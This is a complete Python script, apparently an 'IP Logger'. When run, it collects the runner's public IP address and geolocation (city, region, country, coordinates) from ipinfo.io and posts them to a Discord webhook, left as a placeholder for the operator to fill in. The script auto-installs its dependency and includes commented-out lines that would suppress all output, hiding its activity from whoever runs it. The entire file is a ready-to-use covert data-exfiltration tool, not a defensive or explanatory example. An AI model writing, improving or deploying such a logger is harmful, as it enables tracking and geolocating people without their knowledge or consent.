import os
import sys

# Comment out output suppression so you can see errors and responses
# sys.stdout = open(os.devnull, 'w')
# sys.stderr = open(os.devnull, 'w')

try:
    import requests
except ImportError:
    import subprocess
    subprocess.call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

def get_ip():
    try:
        r = requests.get("https://ipinfo.io/json", timeout=5)
        d = r.json()
        return {
            "IP": d.get("ip"),
            "City": d.get("city"),
            "Region": d.get("region"),
            "Country": d.get("country"),
            "Coordinates": d.get("loc")
        }
    except Exception as e:
        return {"Error": f"Failed to fetch: {e}"}

def send_to_discord(data):
    webhook = "Your Discord Webhook Goes Here"
    try:
        embed = {
            "title": "📡 IP Info",
            "color": 0x00ffcc,
            "fields": [{"name": k, "value": v or "N/A", "inline": False} for k, v in data.items()]
        }
        payload = {"username": "IP Logger", "embeds": [embed]}
        response = requests.post(webhook, json=payload)
        print(f"Discord response: {response.status_code} - {response.text}")
    except Exception as e:
        print("Error sending to Discord:", e)

if __name__ == "__main__":
    data = get_ip()
    print("Data collected:", data)
    send_to_discord(data)
